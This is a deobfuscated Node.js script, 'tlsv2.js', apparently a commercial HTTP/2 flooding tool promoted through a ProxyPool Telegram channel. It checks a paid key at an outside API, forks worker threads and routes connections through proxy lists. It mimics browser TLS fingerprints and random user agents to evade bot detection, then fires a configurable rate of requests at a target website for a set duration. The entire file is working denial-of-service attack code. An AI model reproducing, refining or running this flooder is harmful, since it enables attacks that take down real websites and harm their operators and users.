//Wed Jul 30 2025 06:52:01 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const https = require("https");
white = "[1;37m";
grey = "[0;37m";
purple = "[0;35m";
red = "[1;31m";
bs = "[1;38m";
green = "[1;32m";
yellow = "[1;33m";
purple = "[0;35m";
cyan = "[0;36m";
Cafe = "[0;33m";
fucsya = "[1;35m";
blue = "[1;34m";
jj = "[1;30m";
transparent = "e[0m";
defcol = "[0m";
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
if (process.argv.length < 8) {
  console.log(red + "[" + blue + "usage:" + red + "] - " + red + "node tlsv2.js key target time rate thread proxy.txt" + defcol);
  process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureProtocol = "TLS_client_method";
const headers = {};
const secureContextOptions = {
  "ciphers": ciphers,
  "sigalgs": sigalgs,
  "honorCipherOrder": true,
  "secureOptions": secureOptions,
  "secureProtocol": secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);
var userAgents = readLines("ua.txt");
const args = {
  "key": process.argv[2],
  "target": process.argv[3],
  "time": ~~process.argv[4],
  "Rate": ~~process.argv[5],
  "threads": ~~process.argv[6],
  "proxyFile": process.argv[7]
};
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  const apiKey = args.key;
  const apiURL = "https://proxypool.us/script.php?key=" + apiKey + "&script=script";
  https.get(apiURL, _0x5d7057 => {
    let _0x373245 = "";
    _0x5d7057.on("data", _0xb9539 => {
      _0x373245 += _0xb9539;
    });
    _0x5d7057.on("end", () => {
      {
        const _0x5c000a = JSON.parse(_0x373245);
        if (_0x5c000a.status === "error") {
          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "API Error: " + red + ("" + _0x5c000a.message) + defcol);
          process.exit(1);
        } else {
          const _0x27674d = readLines(args.proxyFile);
          const _0x1d3f98 = _0x27674d.length;
          console.log(red + "[" + jj + "TG By @ProxyPool_news" + red + "] - " + green + "TLSv2 script is running");
          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Target: " + red + ("" + args.target));
          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Time: " + green + ("" + args.time) + "s");
          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Threads: " + green + ("" + args.threads));
          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Proxy: " + blue + ("" + args.proxyFile));
          console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "Proxy quantity: " + green + ("" + _0x1d3f98) + defcol);
          for (let _0xdd39f8 = 1; _0xdd39f8 <= args.threads; _0xdd39f8++) {
            cluster.fork();
          }
        }
      }
    });
  }).on("error", _0xcbffed => {
    console.log(red + "[" + blue + "TLSv2" + red + "] - " + yellow + "API Error: " + red + ("" + _0xcbffed.message) + defcol);
    process.exit(1);
  });
} else {
  setInterval(runFlooder);
  setTimeout(() => {
    process.exit(0);
  }, args.time * 1000);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x15d27b, _0x29802c) {
    const _0x284165 = _0x15d27b.address.split(":");
    const _0x166b22 = _0x284165[0];
    const _0x410309 = "CONNECT " + _0x15d27b.address + ":443 HTTP/1.1\r\nHost: " + _0x15d27b.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x2fa9c0 = new Buffer.from(_0x410309);
    const _0x41ee3c = net.connect({
      "host": _0x15d27b.host,
      "port": _0x15d27b.port,
      "allowHalfOpen": true,
      "writable": true,
      "readable": true
    });
    _0x41ee3c.setTimeout(_0x15d27b.timeout * 10000);
    _0x41ee3c.setKeepAlive(true, 10000);
    _0x41ee3c.setNoDelay(true);
    _0x41ee3c.on("connect", () => {
      _0x41ee3c.write(_0x2fa9c0);
    });
    _0x41ee3c.on("data", _0x1eb23f => {
      const _0x394fb6 = _0x1eb23f.toString("utf-8");
      const _0x124a14 = _0x394fb6.includes("HTTP/1.1 200");
      if (_0x124a14 === false) {
        _0x41ee3c.destroy();
        return _0x29802c(undefined, "error: invalid response from proxy server");
      }
      return _0x29802c(_0x41ee3c, undefined);
    });
    _0x41ee3c.on("timeout", () => {
      {
        _0x41ee3c.destroy();
        return _0x29802c(undefined, "error: timeout exceeded");
      }
    });
    _0x41ee3c.on("error", _0x59e6b3 => {
      {
        _0x41ee3c.destroy();
        return _0x29802c(undefined, "error: " + _0x59e6b3);
      }
    });
  }
}
const Socker = new NetSocket();
function readLines(_0x25f8c8) {
  return fs.readFileSync(_0x25f8c8, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x39f7cc, _0x17bef8) {
  return Math.floor(Math.random() * (_0x17bef8 - _0x39f7cc) + _0x39f7cc);
}
function randomElement(_0x2f639b) {
  return _0x2f639b[randomIntn(0, _0x2f639b.length)];
}
function randomCharacters(_0x1d3a21) {
  output = "";
  for (let _0x1bb514 = 0; _0x1bb514 < _0x1d3a21; _0x1bb514++) {
    {
      output += randomElement(characters);
    }
  }
  return output;
}
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
headers["accept-encoding"] = "gzip, deflate, br";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "same-origin";
headers["upgrade-insecure-requests"] = "1";
function runFlooder() {
  const _0x38f7d6 = randomElement(proxies);
  const _0x877872 = _0x38f7d6.split(":");
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = randomElement(userAgents);
  headers["x-forwarded-for"] = _0x877872[0];
  const _0x5da10e = {
    "host": _0x877872[0],
    "port": ~~_0x877872[1],
    "address": parsedTarget.host + ":443",
    "timeout": 15
  };
  Socker.HTTP(_0x5da10e, (_0x400d6c, _0xd3ceae) => {
    if (_0xd3ceae) return;
    _0x400d6c.setKeepAlive(true, 60000);
    _0x400d6c.setNoDelay(true);
    const _0x5f43a2 = {
      "enablePush": false,
      "initialWindowSize": 1073741823
    };
    const _0x26ba1f = {
      "port": 443,
      "secure": true,
      "ALPNProtocols": ["h2"],
      "ciphers": ciphers,
      "sigalgs": sigalgs,
      "requestCert": true,
      "socket": _0x400d6c,
      "ecdhCurve": ecdhCurve,
      "honorCipherOrder": false,
      "host": parsedTarget.host,
      "rejectUnauthorized": false,
      "clientCertEngine": "dynamic",
      "secureOptions": secureOptions,
      "secureContext": secureContext,
      "servername": parsedTarget.host,
      "secureProtocol": secureProtocol
    };
    const _0x5c2005 = tls.connect(443, parsedTarget.host, _0x26ba1f);
    _0x5c2005.allowHalfOpen = true;
    _0x5c2005.setNoDelay(true);
    _0x5c2005.setKeepAlive(true, 60000);
    _0x5c2005.setMaxListeners(0);
    const _0x225427 = http2.connect(parsedTarget.href, {
      "protocol": "https:",
      "settings": _0x5f43a2,
      "maxSessionMemory": 3333,
      "maxDeflateDynamicTableSize": 4294967295,
      "createConnection": () => _0x5c2005
    });
    _0x225427.setMaxListeners(0);
    _0x225427.settings(_0x5f43a2);
    _0x225427.on("connect", () => {
      {
        const _0x2be9db = setInterval(() => {
          for (let _0x1a5560 = 0; _0x1a5560 < args.Rate; _0x1a5560++) {
            headers.referer = "https://" + parsedTarget.host + parsedTarget.path;
            const _0x538ca6 = _0x225427.request(headers).on("response", _0x560733 => {
              _0x538ca6.close();
              _0x538ca6.destroy();
              return;
            });
            _0x538ca6.end();
          }
        }, 1000);
      }
    });
    _0x225427.on("close", () => {
      _0x225427.destroy();
      _0x400d6c.destroy();
      return;
    });
    _0x225427.on("error", _0xd3ceae => {
      _0x225427.destroy();
      _0x400d6c.destroy();
      return;
    });
  });
}
process.on("uncaughtException", _0x19f1b2 => {});
process.on("unhandledRejection", _0x21092f => {});
_0xod7 = "jsjiami.com.v6";